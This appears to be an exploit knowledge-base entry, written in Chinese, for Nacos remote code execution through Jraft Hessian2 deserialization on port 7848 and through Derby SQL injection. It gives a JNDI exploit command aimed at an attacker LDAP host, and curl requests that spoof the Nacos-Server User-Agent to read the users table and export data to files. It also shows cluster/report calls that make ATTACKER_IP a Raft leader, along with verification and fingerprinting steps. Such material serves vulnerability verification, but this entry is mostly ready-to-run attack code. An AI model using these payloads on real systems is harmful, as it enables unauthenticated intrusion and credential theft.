---
id: NACOS-DESER-RCE
title: Nacos Raft反序列化与Hessian2远程代码执行
product: nacos
vendor: Alibaba
version_affected: "< 2.4.0, 1.x all"
severity: CRITICAL
tags: [rce, deserialization, 国产, 中间件, 无需认证]
fingerprint: ["Nacos", "nacos", ":7848", "/nacos/"]
---

## 漏洞描述

Nacos Raft协议端口(7848)和Hessian反序列化漏洞可导致远程代码执行。

## 影响版本

- Nacos < 2.4.0
- Nacos 1.x 全版本

## 前置条件

- 目标开放 7848 端口（Raft协议）或 8848 端口（HTTP API）
- Nacos 以集群模式运行（7848端口利用）
- 无需认证凭据

## 利用步骤

### Jraft Hessian2 反序列化 (端口7848)

Nacos集群模式下7848端口暴露Raft协议，存在Jraft Hessian2反序列化RCE:

```bash
# 使用 JNDI 注入
python3 nacos_rce.py -t target -p 7848 --jndi ldap://attacker:1389/Exploit
```

### Derby SQL注入导致RCE

Nacos内嵌Derby数据库，通过Server端身份可执行SQL:
```http
POST /nacos/v1/cs/ops/derby?sql=select+*+from+users HTTP/1.1
Host: target:8848
User-Agent: Nacos-Server
```

注入恶意SQL:
```
sql=select * from users; CALL SYSCS_UTIL.SYSCS_EXPORT_TABLE_TO_FILE(null,'USERS','/tmp/test','','','UTF-8')
```

### CNVD-2023-45001: 集群远程代码执行

利用 `/nacos/v1/core/cluster/report` 接口进行Raft协议攻击:
```http
POST /nacos/v1/core/cluster/report HTTP/1.1
Content-Type: application/json

{"ip":"attacker_ip","port":7848,"state":"LEADER"}
```

## Payload

```bash
# Derby SQL注入读取用户表
curl -s "http://target:8848/nacos/v1/cs/ops/derby?sql=select+*+from+users" \
  -H "User-Agent: Nacos-Server"

# 通过cluster/report注入Raft节点
curl -X POST "http://target:8848/nacos/v1/core/cluster/report" \
  -H "Content-Type: application/json" \
  -d '{"ip":"ATTACKER_IP","port":7848,"state":"LEADER"}'
```

## 验证方法

```bash
# 1) Derby 未授权 SQL：让接口把本次标记算出来回显，不回显就说明没被当成 Server 身份执行
curl -s "http://target:8848/nacos/v1/cs/ops/derby?sql=select+'POC_TOKEN'+from+sysibm.sysdummy1" \
  -H "User-Agent: Nacos-Server"
# 判据：响应体里出现 POC_TOKEN（本次请求才引入的串）
# 反例：403 或 {"message":...} 这类鉴权失败报文、空响应，都不算——接口收下请求不等于能执行 SQL

# 2) 同一接口直接读 users 表，看是否返回真实行
curl -s "http://target:8848/nacos/v1/cs/ops/derby?sql=select+*+from+users" \
  -H "User-Agent: Nacos-Server"
# 判据：响应是 users 表的数据行，字段带 username / password / enabled
# 反例：只返回 {"message":"user not found!"} 之类的错误 JSON，不算

# 3) Raft 注入：让目标把攻击者当集群节点，用带外确认注入生效
curl -s -X POST "http://target:8848/nacos/v1/core/cluster/report" \
  -H "Content-Type: application/json" \
  -d '{"ip":"OOB_DOMAIN","port":7848,"state":"LEADER"}'
# 判据：在 OOB_DOMAIN:7848 上收到目标发起的 Raft 连接（Jraft 握手字节，不是 HTTP 探测）
# 反例：7848 端口能连上、或该 POST 返回 200 空白响应，都不算——只证明端口在，不证明节点被注入
```

## 指纹确认

```bash
curl -s http://target:8848/nacos/v1/console/server/state
nmap -p 7848 target
```
